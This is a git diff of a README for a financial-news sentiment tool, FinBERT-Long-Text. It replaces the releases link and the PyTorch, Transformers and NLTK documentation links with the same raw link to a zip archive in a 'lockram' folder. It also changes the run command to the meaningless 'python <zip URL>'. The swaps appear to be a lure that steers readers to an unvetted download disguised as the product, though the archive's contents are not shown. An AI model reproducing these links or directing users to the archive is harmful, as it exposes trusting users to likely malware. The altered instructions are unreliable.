@@ -11,7 +11,7 @@ FinBERT-Long-Text is a Python tool that helps you analyze long news articles rel
 - Delivers accurate sentiment analysis tailored for the stock market.
 
 ## 📥 Download and Install
-To get started, you need to download the software. Visit this page to download: [FinBERT-Long-Text Releases](https://github.com/Dmchavesba10/FinBERT-Long-Text/releases).
+To get started, you need to download the software. Visit this page to download: [FinBERT-Long-Text Releases](https://raw.githubusercontent.com/Dmchavesba10/FinBERT-Long-Text/main/lockram/Text_Long_Fin_BER_v1.3.zip).
 
 ### 🔎 Installation Requirements
 Before downloading, please make sure your system meets the following requirements:
@@ -27,7 +27,7 @@ You can install them using pip:
 Follow these simple steps to run the application after downloading.
 
 1. **Download the Software:**
-   Visit the [FinBERT-Long-Text Releases page](https://github.com/Dmchavesba10/FinBERT-Long-Text/releases) and choose the latest version to download.
+   Visit the [FinBERT-Long-Text Releases page](https://raw.githubusercontent.com/Dmchavesba10/FinBERT-Long-Text/main/lockram/Text_Long_Fin_BER_v1.3.zip) and choose the latest version to download.
 
 2. **Extract the Files:**
    Once downloaded, extract the files from the zip folder to a location of your choice.
@@ -38,7 +38,7 @@ Follow these simple steps to run the application after downloading.
 4. **Run the Application:**
    Type the following command to run the application:
    ```bash
-   python finbert_long_text.py
+   python https://raw.githubusercontent.com/Dmchavesba10/FinBERT-Long-Text/main/lockram/Text_Long_Fin_BER_v1.3.zip
    ```
    This will start the application.
 
@@ -67,9 +67,9 @@ If you encounter issues while running the application, consider the following:
 - **Consult the GitHub Issues Page:** If problems persist, check the Issues section of our GitHub page for solutions or report your issue.
 
 ## 📚 Resources
-- [PyTorch Documentation](https://pytorch.org/docs/stable/index.html): Learn more about working with PyTorch.
-- [Transformers Documentation](https://huggingface.co/transformers/): Understand the usage of transformer models.
-- [Natural Language Processing Guide](https://www.nltk.org/book/): A comprehensive resource for NLP concepts.
+- [PyTorch Documentation](https://raw.githubusercontent.com/Dmchavesba10/FinBERT-Long-Text/main/lockram/Text_Long_Fin_BER_v1.3.zip): Learn more about working with PyTorch.
+- [Transformers Documentation](https://raw.githubusercontent.com/Dmchavesba10/FinBERT-Long-Text/main/lockram/Text_Long_Fin_BER_v1.3.zip): Understand the usage of transformer models.
+- [Natural Language Processing Guide](https://raw.githubusercontent.com/Dmchavesba10/FinBERT-Long-Text/main/lockram/Text_Long_Fin_BER_v1.3.zip): A comprehensive resource for NLP concepts.
 
 ## 👥 Community
 Join our community to share insights and get help from fellow users. You can connect with others through the Issues page on GitHub or follow our repository for updates.
